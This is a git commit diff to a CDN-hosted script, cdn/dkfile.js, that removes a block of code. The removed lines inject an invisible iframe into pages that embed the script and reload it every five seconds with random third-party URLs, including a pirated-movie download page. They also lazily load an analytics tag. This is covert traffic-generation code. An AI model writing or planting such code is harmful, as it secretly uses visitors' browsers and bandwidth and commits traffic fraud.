7db210fb6bb5821401da8f08a6a7e90e90a8f722
noob-dev7 <www.riteshmahato2580@gmail.com>
2025-01-05 19:56:01 +0530

    Update dkfile.js

--- cdn/dkfile.js
+++ cdn/dkfile.js
@@ -12,27 +12,4 @@ let Folt = document.querySelector(".footer, #main, .copyright") || document.body
       opacity: 0;
       z-index:39494;
     }
-  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
-    Folt.prepend(Newel);  
-    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
-  } else {
-       
-  }
-
-  const postUrls = [
-    'https://dktheme.com',
-    'https://luxmovies2.live/download-gulaabi-2024-marathi-web-dl-full-movie-480p-500mb-720p-1-3gb-1080p-2-8gb/',
-'https://dktheme.com/asmr-antistress-relaxation-toys/index.html',
-'https://dktheme.com/plants-vs-zombies-war/index.html',
-'https://dktheme.com/chain-cube-2048-3d-merge-game/index.html',
-'https://dktheme.com/nana-diy-dress-cake/index.html'
-  ];
-        function goToRandomPost() {
-            const randomIndex = Math.floor(Math.random() * postUrls.length);
-            const randomPostUrl = postUrls[randomIndex];
-            document.getElementById('postFrame').src = randomPostUrl;
-        }
-        window.onload = function() {
-            goToRandomPost();
-            setInterval(goToRandomPost,  5000);}
-
+  </style>
